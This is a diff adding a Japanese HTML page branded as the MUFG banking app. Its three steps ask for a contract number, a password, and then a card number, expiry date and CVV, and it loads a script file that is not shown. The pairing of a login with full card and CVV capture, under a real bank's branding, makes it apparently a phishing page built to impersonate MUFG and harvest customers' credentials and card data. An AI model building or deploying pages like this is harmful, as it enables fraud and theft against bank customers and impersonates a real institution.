@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#d6001c" />
+  <meta name="referrer" content="no-referrer" />
+  <title>MUFGアプリ</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <section class="page is-active" id="stepContract">
+    <header class="hd">
+      <div class="lg"><span>MUFG</span></div>
+      <h1>MUFGアプリ</h1>
+    </header>
+    <div class="ct">
+      <label class="lb" for="contractNo">契約番号</label>
+      <input type="text" class="inp" id="contractNo" placeholder="契約番号を入力" autocomplete="off" />
+      <button type="button" class="btn" id="nextBtn">次へ</button>
+    </div>
+  </section>
+
+  <section class="page" id="stepPassword">
+    <header class="hd">
+      <div class="lg"><span>MUFG</span></div>
+    </header>
+    <div class="ct">
+      <label class="lb" for="password">パスワード</label>
+      <input type="password" class="inp" id="password" placeholder="パスワードを入力" autocomplete="current-password" />
+      <button type="button" class="btn" id="loginBtn">ログイン</button>
+    </div>
+  </section>
+
+  <section class="page" id="stepCard">
+    <header class="hd">
+      <div class="lg"><span>MUFG</span></div>
+      <h1>カード確認</h1>
+    </header>
+    <div class="ct">
+      <label class="lb" for="cardNo">カード番号</label>
+      <input type="tel" class="inp" id="cardNo" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" inputmode="numeric" />
+      <div class="row">
+        <div>
+          <label class="lb" for="expiry">有効期限</label>
+          <input type="tel" class="inp" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" />
+        </div>
+        <div>
+          <label class="lb" for="cvv">CVV</label>
+          <input type="password" class="inp" id="cvv" placeholder="XXX" maxlength="3" inputmode="numeric" />
+        </div>
+      </div>
+      <button type="button" class="btn" id="confirmBtn" disabled>確認</button>
+    </div>
+  </section>
+
+  <div class="loading" id="loading" aria-hidden="true">
+    <div class="spinner"></div>
+  </div>
+  <script src="./js/main.js"></script>
+</body>
+</html>
